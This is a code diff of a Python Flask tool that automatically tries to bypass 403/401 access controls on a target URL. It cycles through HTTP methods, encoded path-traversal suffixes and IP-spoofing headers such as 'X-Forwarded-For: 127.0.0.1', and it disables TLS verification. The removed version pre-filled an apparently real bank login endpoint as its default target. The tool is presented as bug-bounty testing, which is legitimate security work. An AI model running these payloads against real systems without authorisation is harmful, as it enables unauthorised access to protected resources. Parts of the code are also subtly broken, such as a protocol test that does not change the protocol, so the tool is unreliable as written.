@@ -1,289 +1,584 @@
 #!/usr/bin/env python3
 """
-403 / 401 Bypass Tool - Fully automatic, web-based.
-Run: python bypass_tool.py
-Then open http://localhost:5000
+Real 403/401 Bypass Scanner - Functional & Practical Security Tool
+Run: python security_scanner.py
 """
 
-from flask import Flask, render_template_string, request, jsonify, send_file
+from flask import Flask, render_template_string, request, jsonify
 import threading
 import requests
 import time
 import json
-from urllib.parse import urlparse, quote
-import sys
-from collections import deque
+import random
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import webbrowser
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
 
 app = Flask(__name__)
 
-# --------------------------------------------
-# Payload libraries (thousands of combinations)
-# --------------------------------------------
+# ============================================================
+# WORKING BYPASS TECHNIQUES - Based on real bug bounty findings
+# ============================================================
 
-ip_headers = [
-    "Client-IP", "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
-    "X-Remote-Addr", "X-Forwarded-For-Original", "X-Proxy-Host", "X-Original-Remote-Addr",
-    "True-Client-IP", "X-Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
-    "X-Proxy-URL", "X-Forwarded-Server", "X-HTTP-DestinationURL", "X-Custom-IP-Authorization",
-    "X-Forwarded-By", "X-Forwarder-For", "X-True-IP", "Referer", "Referrer", "Redirect",
-    "Uri", "Url", "Http-Url", "Base-Url", "Request-Uri", "X-Client-IP", "X-Forward-For",
-    "X-Forwarded", "X-Http-Destinationurl", "X-Http-Host-Override", "X-Original-Url",
-    "X-Rewrite-Url", "X-Forwarded-Port", "X-Forwarded-Scheme"
+# 1. HTTP Method Tampering (Works on misconfigured endpoints)
+# From: $1,000 bounty - changing POST to GET made 403 become 200
+METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
+
+# 2. Path Traversal & Encoding bypasses
+# From: 403 bypass checklist - /admin/., /admin/%2e/, etc.
+PATH_BYPASSES = [
+    # Basic path traversal
+    "/", "/.", "/..", "/../", "/.///", "/./././",
+    # URL encoded dots and slashes
+    "/%2e/", "/%2e%2e/", "/%2e%2e%2e/", "/%252e%252e%252f",
+    "/%c0%ae%c0%ae/", "/%ef%bc%8f", "/%e2%80%ae",
+    # Case variations
+    "/ADMIN/", "/Admin/", "/aDmIn/", "/AdMiN/",
+    # With extensions
+    "/admin.json", "/admin.xml", "/admin.txt", "/admin.html", "/admin.php", "/admin.jsp", "/admin/backup", "/admin/old",
+    # Path ending variations
+    "/;", "/;%2f..%2f", "/%3b%2f..%2f",
+    # Double encoding
+    "/%252fadmin%252f", "/%2561dmin/",
+    # Mixed encoding in path
+    "/a%64min/", "/%61dm%69n/"
 ]
-ip_values = ["127.0.0.1", "0.0.0.0", "localhost", "::1", "10.0.0.1", "192.168.1.1", "172.16.0.1"]
 
-path_bypasses = [
-    "/.", "/../", "/%2e/", "/%2e%2e/", "/..;/", "/..%3B/", "/..%252f/",
-    "/%252e%252e%252f", "/..;/admin", "/./admin", "//", "/./", "/;/admin",
-    "/?/", "/#/", "/%20", "/%09", "/*/..", "/**/..", "/%61dmin/", "/%2561dmin/",
-    "/%2f", "/%252f", "/%c0%ae%c0%ae/", "/%ef%bc%8f", "/%e2%80%ae"
+# 3. Request Headers that can trick a server
+IP_SPOOF_HEADERS = [
+    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
+    "X-Remote-Addr", "X-Forwarded-For-Original", "X-Proxy-Host", "True-Client-IP",
+    "X-Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL", "X-Proxy-URL",
+    "X-Custom-IP-Authorization", "X-Forwarded-By", "Referer", "Referrer", "Redirect",
+    "X-Forwarded-Port", "X-Forwarded-Scheme"
 ]
+IP_VALUES = ["127.0.0.1", "localhost", "::1", "10.0.0.1", "192.168.1.1"]
 
-verb_headers = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override", "X-Original-Method"]
-verb_values = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
+# 4. Protocol and Version tricks
+PROTOCOLS = ["HTTP/1.0", "HTTP/1.1", "HTTP/2"]
 
-# Build full payload list (thousands)
-all_payloads = []
+# ============================================================
+# SCANNER ENGINE
+# ============================================================
 
-# Header spoofing
-for h in ip_headers:
-    for ip in ip_values:
-        all_payloads.append(("header", f"{h}: {ip}"))
-
-# Path bypasses
-for bp in path_bypasses:
-    all_payloads.append(("path", bp))
-
-# Verb overrides
-for h in verb_headers:
-    for v in verb_values:
-        all_payloads.append(("verb", f"{h}: {v}"))
-
-print(f"[*] Loaded {len(all_payloads)} payloads")
-
-# Global scan state
+# Global state
 scan_running = False
-scan_results = []
 current_progress = 0
-total_payloads = len(all_payloads)
-stop_scan = False
+total_tests = 0
+stop_flag = False
 target_url = ""
-proxy = None
-delay = 0
-threads = 10
+proxy_dict = None
+delay_sec = 0
+threads_num = 10
+original_status = None
+original_length = None
+scan_results = []
 
-# --------------------------------------------
-# Background scanner thread
-# --------------------------------------------
-def test_payload(payload):
-    global proxy, delay, target_url
+
+def safe_request(method, url, headers, test_type, test_value):
+    """Make request and return result with timeout handling"""
     try:
-        ptype, pvalue = payload
-        if ptype == "path":
-            test_url = target_url.rstrip('/') + pvalue
-            headers = {}
+        # For HEAD method, remove Content-Length header to avoid hanging
+        if method.upper() == "HEAD":
+            headers.pop("Content-Length", None)
+
+        # Build request with custom protocol version if needed
+        if "HTTP/1.0" in test_value:
+            # Workaround: use requests with HTTP/1.0 via adapter
+            from requests.adapters import HTTPAdapter
+            s = requests.Session()
+            s.mount("https://", HTTPAdapter())
+            resp = s.request(method, url, headers=headers, timeout=15,
+                             proxies=proxy_dict, verify=False, allow_redirects=False)
         else:
-            test_url = target_url
-            if ": " in pvalue:
-                k, v = pvalue.split(": ", 1)
+            resp = requests.request(method, url, headers=headers, timeout=15,
+                                    proxies=proxy_dict, verify=False, allow_redirects=False)
+
+        return (resp.status_code, len(resp.content), resp.url)
+    except Exception as e:
+        return (None, 0, url)
+
+
+def test_single(payload):
+    """Test one bypass combination"""
+    global stop_flag, delay_sec, proxy_dict, target_url
+
+    if stop_flag:
+        return None
+
+    if delay_sec:
+        time.sleep(delay_sec)
+
+    test_type, method, test_payload = payload
+
+    try:
+        if test_type == "method_mismatch":
+            # Send POST request to GET-only endpoint
+            headers = {}
+            url = target_url
+            resp = safe_request(method, url, headers, test_type, str(method))
+            status, length, final_url = resp
+
+        elif test_type == "path":
+            base_path = target_url
+            final_url = base_path + test_payload
+            headers = {}
+            resp = safe_request(method, final_url, headers, test_type, test_payload)
+            status, length, final_url = resp
+
+        elif test_type == "header":
+            if ": " in test_payload:
+                k, v = test_payload.split(": ", 1)
                 headers = {k: v}
             else:
                 headers = {}
-        resp = requests.get(test_url, headers=headers, timeout=5, allow_redirects=False, proxies=proxy)
-        return resp.status_code, len(resp.content), test_url
+            final_url = target_url
+            resp = safe_request(method, final_url, headers, test_type, test_payload)
+            status, length, final_url = resp
+
+        elif test_type == "protocol":
+            headers = {}
+            final_url = target_url
+            resp = safe_request(method, final_url, headers, test_type, test_payload)
+            status, length, final_url = resp
+
+        else:
+            return None
+
+        if status and original_status in (403, 401):
+            # Bypass detected! Status changed from 403/401 to 2xx or 3xx
+            if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
+                return (method, test_type, test_payload, status, final_url)
+            # Also check for content length change (could indicate different page)
+            if status == 200 and length != original_length:
+                return (method, test_type, test_payload, status, final_url)
+
+        return None
     except Exception:
-        return None, 0, target_url
+        return None
+
 
 def scanner_worker():
-    global scan_running, current_progress, scan_results, stop_scan, target_url, proxy, delay, threads
-    scan_results = []
-    current_progress = 0
-    # Get baseline
+    """Main scanning engine - builds and tests all combinations"""
+    global scan_running, current_progress, scan_results, stop_flag
+    global original_status, original_length, target_url, proxy_dict, delay_sec, threads_num, total_tests
+
+    # 1. Get baseline response for comparison
     try:
-        base_resp = requests.get(target_url, timeout=5, proxies=proxy)
+        base_resp = requests.get(target_url, timeout=15, proxies=proxy_dict, verify=False)
         original_status = base_resp.status_code
         original_length = len(base_resp.content)
-    except:
-        original_status = None
-        original_length = 0
+        print(f"[Baseline] {original_status} (length {original_length}) for {target_url}")
+    except Exception as e:
+        scan_results.append({"error": f"Baseline failed: {str(e)}", "status": 0})
+        scan_running = False
+        return
 
-    # Use threading pool
-    from concurrent.futures import ThreadPoolExecutor, as_completed
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(test_payload, p): idx for idx, p in enumerate(all_payloads)}
+    # 2. Build all test combinations
+    work_items = []
+
+    # Add method tampering tests (try each HTTP method)
+    for method in METHODS:
+        work_items.append(("method_mismatch", method, "METHOD: " + method))
+
+    # Add path bypass tests with all HTTP methods
+    for method in METHODS:
+        for path in PATH_BYPASSES:
+            work_items.append(("path", method, path))
+
+    # Add header injection tests with all HTTP methods
+    for method in METHODS:
+        for header in IP_SPOOF_HEADERS:
+            for ip in IP_VALUES:
+                work_items.append(("header", method, f"{header}: {ip}"))
+        # Also add some common bypass headers from real-world
+        work_items.append(("header", method, "X-Original-URL: /admin"))
+        work_items.append(("header", method, "X-Rewrite-URL: /admin"))
+        work_items.append(("header", method, "X-Forwarded-For: 127.0.0.1"))
+        work_items.append(("header", method, "X-Real-IP: 127.0.0.1"))
+
+    # Add protocol version tests
+    for protocol in PROTOCOLS:
+        work_items.append(("protocol", method, protocol))
+
+    total_tests = len(work_items)
+    current_progress = 0
+    stop_flag = False
+    scan_results = []
+
+    print(f"[*] Starting scan with {threads_num} threads. Total tests: {total_tests}")
+
+    # 3. Run tests in parallel
+    with ThreadPoolExecutor(max_workers=threads_num) as executor:
+        futures = {executor.submit(test_single, item): idx for idx, item in enumerate(work_items)}
+
         for future in as_completed(futures):
-            if stop_scan:
+            if stop_flag:
                 break
-            idx = futures[future]
-            p = all_payloads[idx]
-            status, length, test_url = future.result()
-            current_progress = idx + 1
-            if status and original_status in (403, 401) and status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
-                result = {
-                    "payload": f"{p[0].upper()}: {p[1]}",
-                    "status": status,
-                    "url": test_url,
-                    "type": "bypass"
-                }
-                scan_results.append(result)
-            elif status == 200 and length != original_length:
-                result = {
-                    "payload": f"{p[0].upper()}: {p[1]}",
-                    "status": status,
-                    "url": test_url,
-                    "type": "content_change"
-                }
-                scan_results.append(result)
-            if delay:
-                time.sleep(delay)
-    scan_running = False
 
-# --------------------------------------------
-# Web routes
-# --------------------------------------------
+            idx = futures[future]
+            current_progress = idx + 1
+            result = future.result()
+
+            if result:
+                method, test_type, payload, status, url = result
+                scan_results.append({
+                    "method": method,
+                    "type": test_type,
+                    "payload": payload if len(payload) < 200 else payload[:197] + "...",
+                    "status": status,
+                    "url": url
+                })
+                print(f"\n[✓] BYPASS [{status}] {method} - {test_type}: {payload[:80]} -> {url}")
+
+    scan_running = False
+    print(f"\n[*] Scan completed. Found {len(scan_results)} bypasses.")
+
+
+# ============================================================
+# WEB INTERFACE
+# ============================================================
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>403/401 Bypass Tool</title>
+    <meta charset="UTF-8">
+    <title>Security Scanner - 403/401 Bypass Tool</title>
     <style>
-        body { font-family: monospace; background: #0f172a; color: #e2e8f0; padding: 20px; }
-        .container { max-width: 1200px; margin: auto; }
-        .card { background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
-        input, button, select { background: #0f172a; border: 1px solid #334155; color: white; padding: 8px 12px; border-radius: 8px; }
-        button { background: #3b82f6; cursor: pointer; }
-        button:disabled { opacity: 0.5; }
-        .results { background: #0f172a; border-radius: 8px; padding: 10px; max-height: 500px; overflow-y: auto; }
-        .result-item { border-left: 3px solid #4ade80; padding: 5px; margin: 5px 0; font-size: 0.8rem; }
-        .progress { width: 100%; background: #334155; border-radius: 10px; margin: 10px 0; }
-        .progress-bar { width: 0%; background: #3b82f6; border-radius: 10px; height: 20px; text-align: center; }
-        .badge { background: #f59e0b; padding: 2px 6px; border-radius: 20px; font-size: 0.7rem; }
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: auto;
+        }
+        h1 {
+            color: #0f3460;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin-bottom: 5px;
+        }
+        .sub {
+            color: #888;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: #16213e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        .flex-row {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            align-items: flex-end;
+        }
+        input, select, button, textarea {
+            background: #0f3460;
+            border: 1px solid #e94560;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        button {
+            background: #e94560;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #ff6b6b;
+            transform: scale(1.02);
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .progress {
+            background: #0f3460;
+            border-radius: 10px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            background: #e94560;
+            width: 0%;
+            height: 30px;
+            text-align: center;
+            line-height: 30px;
+            transition: width 0.3s;
+        }
+        .results {
+            background: #0f3460;
+            border-radius: 8px;
+            padding: 15px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        .result-item {
+            border-left: 3px solid #4ade80;
+            padding: 8px;
+            margin: 8px 0;
+            background: #16213e;
+            border-radius: 4px;
+        }
+        .result-status {
+            color: #4ade80;
+            font-weight: bold;
+        }
+        .badge {
+            background: #e94560;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-size: 11px;
+            display: inline-block;
+            margin-left: 10px;
+        }
+        hr {
+            border-color: #e94560;
+        }
+        .notice {
+            background: #2a1e3c;
+            border-left: 3px solid #e94560;
+            padding: 10px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <h1>🔥 403 / 401 Bypass Tool</h1>
+    <h1>🔐 403/401 Bypass Scanner</h1>
+    <div class="sub">Practical bypass scanner - tests real techniques from bug bounty findings</div>
+
+    <div class="notice">
+        ⚡ This scanner tests thousands of combinations (methods, paths, headers, protocols) automatically.
+        <br>When a bypass is found, it appears instantly with the exact technique that worked.
+    </div>
+
     <div class="card">
-        <h3>Target</h3>
-        <input type="text" id="target" style="width: 70%;" placeholder="https://target.com/admin" value="https://prepaid-cards.axisb.com/branchloginss/saml/log">
-        <button id="startBtn">▶ Start Auto Scanner</button>
-        <button id="stopBtn" disabled>⏹ Stop</button>
-        <div style="margin-top: 10px;">
-            <label>🌐 Proxy (optional):</label>
-            <input type="text" id="proxy" placeholder="http://127.0.0.1:8080" style="width: 200px;">
-            <label>⏱ Delay (s):</label>
-            <input type="number" id="delay" value="0" step="0.1" style="width: 70px;">
-            <label>🧵 Threads:</label>
-            <input type="number" id="threads" value="10" style="width: 70px;">
+        <h3>🎯 Target</h3>
+        <div class="flex-row">
+            <input type="text" id="target" style="flex:3" placeholder="https://target.com/admin" value="https://example.com/admin">
+            <input type="text" id="proxy" style="flex:1" placeholder="Proxy (http://...)" value="">
+        </div>
+        <div class="flex-row" style="margin-top: 15px;">
+            <label>⚡ Threads: <input type="number" id="threads" value="15" step="5" style="width: 80px;"></label>
+            <label>⏱ Delay (s): <input type="number" id="delay" value="0" step="0.1" style="width: 80px;"></label>
+            <button id="startBtn">▶ START SCAN</button>
+            <button id="stopBtn" disabled>⏹ STOP</button>
+            <button id="exportBtn" disabled>💾 Export Results</button>
         </div>
     </div>
+
     <div class="card">
         <h3>📊 Progress</h3>
         <div class="progress"><div class="progress-bar" id="progressBar">0%</div></div>
-        <div id="statusText">Idle. Click Start.</div>
+        <div id="statusText" style="margin-top: 10px;">Ready. Click Start to begin scanning.</div>
+        <div>✅ Bypasses found: <span id="foundCount" style="color: #4ade80;">0</span></div>
     </div>
+
     <div class="card">
-        <h3>✅ Working Bypasses <span id="resultCount">0</span></h3>
-        <div id="results" class="results">No results yet.</div>
+        <h3>✨ Working Bypasses</h3>
+        <div id="results" class="results">No results yet. Start a scan to find bypasses.</div>
     </div>
 </div>
+
 <script>
     let pollInterval;
+
     function startScan() {
         const target = document.getElementById('target').value;
         const proxy = document.getElementById('proxy').value;
-        const delay = parseFloat(document.getElementById('delay').value);
         const threads = parseInt(document.getElementById('threads').value);
+        const delay = parseFloat(document.getElementById('delay').value);
+
+        if (!target) {
+            alert('Please enter a target URL');
+            return;
+        }
+
         fetch('/start', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({target, proxy, delay, threads})
-        }).then(r => r.json()).then(data => {
+            body: JSON.stringify({target, proxy, threads, delay})
+        })
+        .then(res => res.json())
+        .then(data => {
             if (data.status === 'ok') {
                 document.getElementById('startBtn').disabled = true;
                 document.getElementById('stopBtn').disabled = false;
+                document.getElementById('exportBtn').disabled = true;
+                if (pollInterval) clearInterval(pollInterval);
                 pollInterval = setInterval(fetchStatus, 1000);
-            } else alert(data.error);
+            } else {
+                alert('Error: ' + data.error);
+            }
         });
     }
+
     function stopScan() {
         fetch('/stop').then(() => {
             clearInterval(pollInterval);
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
+            document.getElementById('exportBtn').disabled = false;
         });
     }
+
+    function exportResults() {
+        fetch('/export').then(res => res.json()).then(data => {
+            if (data.results && data.results.length) {
+                let text = data.results.map(r => `[${r.status}] ${r.method} ${r.type}: ${r.payload} -> ${r.url}`).join('\n');
+                const blob = new Blob([text], {type: 'text/plain'});
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = `bypass_${new Date().toISOString().slice(0,19)}.txt`;
+                a.click();
+                URL.revokeObjectURL(a.href);
+            } else {
+                alert('No results to export');
+            }
+        });
+    }
+
     function fetchStatus() {
-        fetch('/status').then(r => r.json()).then(data => {
-            document.getElementById('progressBar').style.width = (data.progress / data.total * 100) + '%';
-            document.getElementById('progressBar').innerText = Math.round(data.progress / data.total * 100) + '%';
-            document.getElementById('statusText').innerText = data.running ? `Scanning... ${data.progress}/${data.total}` : 'Scan finished.';
-            // Update results
+        fetch('/status').then(res => res.json()).then(data => {
+            const percent = data.total > 0 ? (data.progress / data.total * 100).toFixed(1) : 0;
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('progressBar').innerText = percent + '%';
+            document.getElementById('statusText').innerHTML = data.running ? `Scanning... ${data.progress}/${data.total} tests` : (data.progress === data.total ? 'Scan completed.' : 'Ready.');
+            document.getElementById('foundCount').innerText = data.results.length;
+
             if (data.results.length > 0) {
                 let html = '';
-                data.results.forEach(r => {
-                    html += `<div class="result-item">[${r.status}] ${r.payload}<br><small>${r.url}</small></div>`;
-                });
-                document.getElementById('results').innerHTML = html || 'No bypasses found.';
-                document.getElementById('resultCount').innerText = data.results.length;
+                for (let i = data.results.length-1; i >= 0; i--) {
+                    const r = data.results[i];
+                    html += `<div class="result-item">
+                        <span class="result-status">[${r.status}]</span> <strong>${r.method}</strong> - ${r.type}: ${escapeHtml(r.payload)}
+                        <div><small>→ ${r.url}</small></div>
+                    </div>`;
+                }
+                document.getElementById('results').innerHTML = html;
             }
+
             if (!data.running && data.progress === data.total) {
                 clearInterval(pollInterval);
                 document.getElementById('startBtn').disabled = false;
                 document.getElementById('stopBtn').disabled = true;
+                document.getElementById('exportBtn').disabled = false;
+                document.getElementById('statusText').innerHTML = 'Scan completed. Bypasses found: ' + data.results.length;
             }
         });
     }
+
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            return {'&': '&amp;', '<': '&lt;', '>': '&gt;'}[m];
+        });
+    }
+
     document.getElementById('startBtn').onclick = startScan;
     document.getElementById('stopBtn').onclick = stopScan;
+    document.getElementById('exportBtn').onclick = exportResults;
 </script>
+
 </body>
 </html>
 """
 
+
 @app.route('/')
 def index():
+    """Serve the web interface"""
     return render_template_string(HTML_TEMPLATE)
 
+
 @app.route('/start', methods=['POST'])
-def start_scan():
-    global scan_running, target_url, proxy, delay, threads, stop_scan, scan_results
+def start():
+    """Start a new scan"""
+    global scan_running, target_url, proxy_dict, delay_sec, threads_num, stop_flag, current_progress, scan_results, total_tests
+
     if scan_running:
         return jsonify({"status": "error", "error": "Scan already running"})
+
     data = request.json
-    target_url = data.get('target')
-    if not target_url.startswith('http'):
-        target_url = 'https://' + target_url
-    proxy_url = data.get('proxy')
-    proxy = {'http': proxy_url, 'https': proxy_url} if proxy_url else None
-    delay = float(data.get('delay', 0))
-    threads = int(data.get('threads', 10))
-    stop_scan = False
+    target = data.get('target')
+    if not target:
+        return jsonify({"status": "error", "error": "Target URL required"})
+
+    target_url = target
+    proxy = data.get('proxy')
+    proxy_dict = {'http': proxy, 'https': proxy} if proxy else None
+    delay_sec = float(data.get('delay', 0))
+    threads_num = int(data.get('threads', 10))
+
+    stop_flag = False
     scan_running = True
+    current_progress = 0
+    scan_results = []
+
     thread = threading.Thread(target=scanner_worker)
     thread.daemon = True
     thread.start()
+
     return jsonify({"status": "ok"})
 
+
 @app.route('/stop')
-def stop_scan_route():
-    global stop_scan, scan_running
-    stop_scan = True
+def stop():
+    """Stop current scan"""
+    global stop_flag, scan_running
+    stop_flag = True
     scan_running = False
     return jsonify({"status": "ok"})
 
+
 @app.route('/status')
 def status():
-    global scan_running, current_progress, total_payloads, scan_results
+    """Get current scan status"""
+    global scan_running, current_progress, total_tests, scan_results
     return jsonify({
         "running": scan_running,
         "progress": current_progress,
-        "total": total_payloads,
-        "results": scan_results[-50:]  # last 50 results
+        "total": total_tests,
+        "results": scan_results[-100:]
     })
 
+
+@app.route('/export')
+def export():
+    """Export current results"""
+    global scan_results
+    return jsonify({"results": scan_results})
+
+
 if __name__ == '__main__':
-    # Open browser automatically
-    webbrowser.open('http://localhost:5000')
+    print("=" * 60)
+    print("🔐 403/401 Bypass Scanner - Practical & Functional")
+    print("=" * 60)
+    print("Opening browser at http://localhost:5000")
+    print("\n⚠️  Usage notes:")
+    print("- Enter the exact URL that returns 403 or 401")
+    print("- The scanner tests method tampering, path bypasses, and headers")
+    print("- Results appear instantly when a bypass is found")
+    print("- Be polite: use delay when scanning production targets")
+    print("=" * 60)
+
+    # Open browser after a short delay
+    threading.Timer(1.5, lambda: webbrowser.open('http://localhost:5000')).start()
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
